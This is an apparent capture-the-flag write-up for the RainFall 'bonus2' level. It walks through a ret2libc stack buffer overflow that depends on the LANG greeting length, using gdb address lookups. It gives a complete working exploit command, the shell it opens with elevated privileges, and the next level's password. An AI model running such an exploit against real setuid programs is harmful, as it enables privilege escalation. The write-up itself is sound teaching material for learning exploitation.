# bonus2

## Header

```bash
ssh bonus2@192.168.64.9 -p 4242
...
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus2/bonus2
```

<hr>

## Solution

From the [source](./source.c) we can understand that there is a `buffer overflow` vulnerability in the `greetuser` function. <br>
In the `main` the buffer of 76 bytes is created and filled with 72 symbols. <br>
Because the internal buffer in `greetuser` function is filled with the buffer of 72 bytes passed from `main` and the fact
the internal buffer is 'pre-filled' with `Hello ` or `Goedemiddag! ` or `Hyvää päivää ` this buffer can be overflowed by 6, 13 and 18 bytes respectively. <br>

```bash
(gdb) info proc map
process 31793
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/user/bonus2/bonus2
         0x8049000  0x804a000     0x1000        0x0 /home/user/bonus2/bonus2
        0xb7e2b000 0xb7e2c000     0x1000        0x0 
        0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fd2000 0xb7fd5000     0x3000        0x0 
        0xb7fdb000 0xb7fdd000     0x2000        0x0 
---Type <return> to continue, or q <return> to quit---q
Quit
(gdb) find 0xb7e2c000, 0xb7fcf000, "/bin/sh" 
0xb7f8cc58
1 pattern found.
(gdb) p system
$2 = {<text variable, no debug info>} 0xb7e6b060 <system>
```


To overwrite return address we need to pass the array of this length:
```
72 (greetuser array size, bytes) - greetuser message length, bytes
```

If we're going to perform `ret2libc` we MUST set `LANG` to `fi` because the other options won't give us necessary amount of bytes to overwrite the target data:
```
"Hyvää päivää " - 18 bytes
"Goedemiddag! " - 13 bytes
"Hello "        - 6 bytes

To perform ret2libc we need 16 bytes: 4 to overwrite saved ebp, 4 for ret address (system), 4 to overwrite greetuser arg, and 4 to set arg /bin/sh for system

We need to create padding of 72 - 18 = 54 + 4 bytes of saved ebp = 58 bytes followed by our payload.
As we passing array data in two arguments, we split 58 bytes padding to 40 and 18.
```

Now we have all the parts to exploit:
```bash
bonus2@RainFall:~$ LANG=fi ./bonus2 $(python -c 'print "X" * 40') $(python -c 'print "X" * 18 + "\xb7\xe6\xb0\x60"[::-1] + "XXXX" + "\xb7\xf8\xcc\x58"[::-1]')
Hyvää päivää XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX`��XXXXX���
$ pwd
/home/user/bonus2
$ id         
uid=2012(bonus2) gid=2012(bonus2) euid=2013(bonus3) egid=100(users) groups=2013(bonus3),100(users),2012(bonus2)
$ cd ../bonus3
$ ls -la
total 17
dr-xr-x---+ 1 bonus3 bonus3   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 bonus3 bonus3  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 bonus3 bonus3 3530 Sep 23  2015 .bashrc
-rw-r--r--+ 1 bonus3 bonus3   65 Sep 23  2015 .pass
-rw-r--r--  1 bonus3 bonus3  675 Apr  3  2012 .profile
-rwsr-s---+ 1 end    users  5595 Mar  6  2016 bonus3
$ cat .pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```

## References
- [ret2libc](https://wiki.bi0s.in/pwning/return2libc/return-to-libc/)

